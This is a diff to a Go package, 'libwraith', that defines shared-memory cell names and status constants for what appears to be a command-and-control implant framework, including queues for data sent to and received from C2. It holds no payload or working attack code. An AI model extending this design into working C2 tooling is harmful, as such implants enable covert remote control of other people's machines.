@@ -1,24 +1,44 @@
 package libwraith
 
+// Wraith status codes for use in SHM_WRAITH_STATUS
+const (
+	// Wraith is not running
+	WSTATUS_INACTIVE = iota
+
+	// Wraith is running correctly
+	WSTATUS_ACTIVE
+
+	// Wraith is shutting down
+	WSTATUS_DEACTIVATING
+
+	// Wraith has exited with a fatal error
+	WSTATUS_ERROR
+)
+
 // Reserved locations in the shared memory with special purposes
 // All other locations should be namespaced
 const (
-	// This cell forces Wraith to exit when it is written to. The value
-	// is irrelevant.
-	SHM_EXIT_TRIGGER = "exitTrigger"
-
 	// This cell forces Wraith to stop and restart all modules whenever
-	// it is written to. The value is irrelevant.
+	// it is written to. The value is irrelevant. It can be written to
+	// by any component.
 	SHM_RELOAD_TRIGGER = "reloadTrigger"
+
+	// This cell contains the current status of Wraith as defined by the
+	// STATUS_ constants. It MUST NOT be written to by any component other
+	// than Wraith itself.
+	SHM_WRAITH_STATUS = "status"
 
 	// This cell stores data which is to be transmitted to C2. This data
 	// should be managed and directed to individual comms modules by the
-	// MOD_COMMS_MANAGER module.
+	// MOD_COMMS_MANAGER module, hence only that module should really read
+	// from this cell, but any module can write to it.
 	SHM_TX_QUEUE = "txQueue"
 
 	// This cell stores all data which has been received from C2 and is
 	// awaiting processing. This data should be managed and directed to
-	// individual comms modules by the MOD_COMMS_MANAGER module.
+	// individual comms modules by the MOD_COMMS_MANAGER module. Hence,
+	// only that module should really read from this cell, but any module
+	// can write to it.
 	SHM_RX_QUEUE = "rxQueue"
 
 	// This cell holds the status of the CommsManager. Modules should not
